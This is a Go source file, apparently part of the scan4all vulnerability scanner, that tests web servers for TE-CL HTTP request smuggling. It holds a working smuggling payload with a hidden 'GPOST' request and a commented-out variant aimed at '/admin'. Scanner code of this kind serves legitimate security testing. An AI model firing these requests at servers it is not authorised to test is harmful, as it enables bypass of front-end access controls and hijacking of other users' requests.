package Smuggling

import (
	"github.com/GhostTroops/scan4all/lib/socket"
	"log"
	"strings"
)

var TeClPayload = []string{`POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Connection: Keep-Alive
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`}

// Transfer-Encoding: chunked-false, chunked
//, `GET %s HTTP/1.1
//Host: %s%s
//Transfer-Encoding: chunkedchunked
//
//26
//GET / HTTP/1.1
//Content-Length: 30
//
//
//0
//
//
//GET /admin HTTP/1.1
//
//`

func init() {
	for n, x := range TeClPayload {
		x = E2EC(x)
		TeClPayload[n] = x
	}

}

type TeCl struct {
	Base
}

func NewTECL() *TeCl {
	x := &TeCl{}
	x.Type = "TE-CL"
	x.Payload = TeClPayload
	return x
}

func (r *TeCl) CheckResponse(body string, payload string) bool {
	if "" != body && (-1 < strings.Index("Unrecognized method GPOST", body)) {
		log.Println("Unrecognized method GPOST")
		return true
	}
	if 3 < len(strings.Split(body, "HTTP/1.1")) {
		log.Println("found 3 HTTP/1.1")
		return true
	}
	return false
}

func (r *TeCl) GetPayloads(t *socket.CheckTarget) *[]string {
	TeClPayload = append(TeClPayload, GenerateHttpSmugglingPay(t.UrlRaw, t.UrlPath, "localhost"))
	return &TeClPayload
}
